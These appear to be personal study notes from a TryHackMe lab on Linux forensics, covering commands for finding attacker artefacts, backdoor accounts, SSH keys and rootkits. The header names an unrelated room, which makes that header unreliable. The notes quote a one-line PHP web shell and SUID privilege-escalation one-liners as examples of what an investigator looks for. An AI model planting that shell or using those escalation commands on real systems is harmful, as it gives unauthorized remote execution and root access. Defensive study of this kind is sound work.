
📅 **Date**: 19 February 25  
📂 **Category**: TryHackMe 
📝 **Status**: Completed  
🔒 **Room**: SQL Injection: Basics
🏷️ Tags: #tryhackme #tryhackme/learn # tryhackme/challenge 

---
# Linux File System Analysis

## Key Areas to Investigate

### Web Server Files
- **Web Directory**: `/var/www/html/`
  - **Command**: `ls -al /var/www/html/`
  - **Focus**: Look for suspicious files in `/uploads` directory.
- **Malicious File Example**: `b2c8e1f5.phtml`
  - **Content**: `<?php system($_GET['cmd']);?>`
  - **Analysis**: Web shell allowing remote command execution.

### Ownership and Permissions
- **Files Owned by `www-data`**:
  - **Command**: `find / -user www-data -type f 2>/dev/null`
  - **Example**: `/var/www/html/assets/reverse.elf` (Meterpreter reverse shell).
- **World-Writable Files**:
  - **Command**: `find / -perm -o+w 2>/dev/null`
  - **Focus**: Check for misconfigured permissions.

### Metadata Analysis
- **Tool**: `exiftool`
  - **Command**: `exiftool <file>`
  - **Output**: File type, size, permissions, timestamps.
  - **Example**: `exiftool /var/www/html/assets/reverse.elf`

### Checksums
- **Tools**: `md5sum`, `sha256sum`
  - **Commands**:
    - `md5sum <file>`
    - `sha256sum <file>`
  - **Use**: Verify file integrity and detect malicious files.
  - **Example**: `md5sum /var/www/html/assets/reverse.elf`

### Timestamps
- **Types**:
  - **mtime**: Last modification time.
  - **ctime**: Last metadata change time.
  - **atime**: Last access time.
- **Tool**: `stat`
  - **Command**: `stat <file>`
  - **Example**: `stat /var/www/html/assets/reverse.elf`

### User Accounts and Groups
- **File**: `/etc/passwd`
  - **Filter UID 0**: `cat /etc/passwd | cut -d: -f1,3 | grep ':0$'`
  - **Focus**: Identify backdoor accounts.
- **Groups**:
  - **Important Groups**: `sudo`, `adm`, `shadow`, `disk`.
  - **Check Group Members**: `getent group <group_name>`

### User Logins and Activity
- **Tools**:
  - `last`: View login history.
  - `lastlog`: Most recent login activity.
  - `who`: Currently logged-in users.
- **Logs**:
  - `/var/log/auth.log` (or `/var/log/secure`): Authentication events.

### Sudoers File
- **Location**: `/etc/sudoers`
- **Check for Unauthorized Entries**: `sudo cat /etc/sudoers`

### User Home Directories
- **Location**: `/home/<username>`
- **Hidden Files**:
  - `.bash_history`: Command history.
  - `.ssh/authorized_keys`: SSH public keys for access.
  - **Example**: Unauthorized key entry with comment "backdoor".

### SSH Backdoors
- **Example**:
  - **File**: `/home/jane/.ssh/authorized_keys`
  - **Content**: Unauthorized public key with comment "backdoor".
  - **Permissions**: World-writable (`rw-rw-rw-`).

### Suspicious Binaries
- **Find Executables**: `find / -type f -executable 2>/dev/null`
- **Strings Analysis**: `strings <binary>`
- **Debsums**: `sudo debsums -e -s` (Check package integrity).

### SUID/SGID Binaries
- **Find SUID Binaries**: `find / -perm -u=s -type f 2>/dev/null`
- **Example Abuse**:
  - **Python SUID Exploit**: `python3.8 -c 'import os; os.execl("/bin/sh", "sh", "-p")'`
  - **Bash SUID Copy**: `/var/tmp/bash -p`

### Rootkit Detection
- **Tools**:
  - **Chkrootkit**: `sudo chkrootkit`
  - **RKHunter**: `sudo rkhunter -c -sk`

---

## Additional Tips
- **Focus on Writable Directories**:
  - `/tmp`, `/var/tmp`, `/dev/shm`: Common targets for malicious file uploads.
- **Check for Unusual Processes**:
  - Use `ps aux` or `top` to identify suspicious processes.
- **Review Cron Jobs**:
  - Check `/etc/crontab` and user-specific cron jobs (`crontab -l`).
- **Network Connections**:
  - Use `netstat -tuln` or `ss -tuln` to identify unusual connections.
- **Log Analysis**:
  - Check `/var/log/syslog`, `/var/log/apache2/access.log`, and other relevant logs.

---

## Summary
- **Key Commands**:
  - `find`, `ls`, `stat`, `exiftool`, `md5sum`, `sha256sum`, `last`, `who`, `getent`.
- **Focus Areas**:
  - Web directories, user accounts, SUID binaries, SSH keys, and rootkits.
- **Goal**: Identify attacker artefacts, misconfigurations, and persistence mechanisms.